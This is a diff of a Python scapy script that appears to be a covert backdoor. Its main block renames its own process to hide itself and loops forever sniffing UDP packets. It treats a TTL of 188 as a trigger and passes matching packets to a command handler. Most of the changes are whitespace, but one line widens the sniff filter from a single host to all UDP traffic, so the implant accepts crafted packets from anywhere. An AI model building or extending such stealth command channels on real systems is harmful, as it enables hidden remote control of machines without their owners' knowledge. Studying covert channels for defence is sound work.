@@ -133,23 +133,23 @@ def getCommand(packet):
 --  Name:       packetCheck
 --  Parameters:
 --      packet
---			The packet object that is sniffed with scapy.
+--          The packet object that is sniffed with scapy.
 --  Return Values:
 --      True
---			If the packet is the right one we're expecting.
---		False
---			If the packet is not the right one we're expecting.
+--          If the packet is the right one we're expecting.
+--      False
+--          If the packet is not the right one we're expecting.
 --  Description:
 --      Function to check if the packet we sniffed is the right one by filtering it
---		by the values we've put in our crafter packets. Returns true or false.
+--      by the values we've put in our crafter packets. Returns true or false.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def packetCheck(packet):
-	if IP in packet[0]:
-		ttl = packet[IP].ttl
-		if ttl == 188:
-			return True
-	else:
-		return False
+    if IP in packet[0]:
+        ttl = packet[IP].ttl
+        if ttl == 188:
+            return True
+    else:
+        return False
 
 if __name__ == "__main__":
     #Immediately rename the process to the specified name.
@@ -159,4 +159,4 @@ if __name__ == "__main__":
     #Sniff for the UDP traffic for packets with TTL of 188 (key identifier)
     #If those conditions are true, then run the getCommand method.
     while True:
-        sniff(filter="udp and host 192.168.0.14", prn=getCommand, stop_filter=packetCheck)
+        sniff(filter="udp", prn=getCommand, stop_filter=packetCheck)
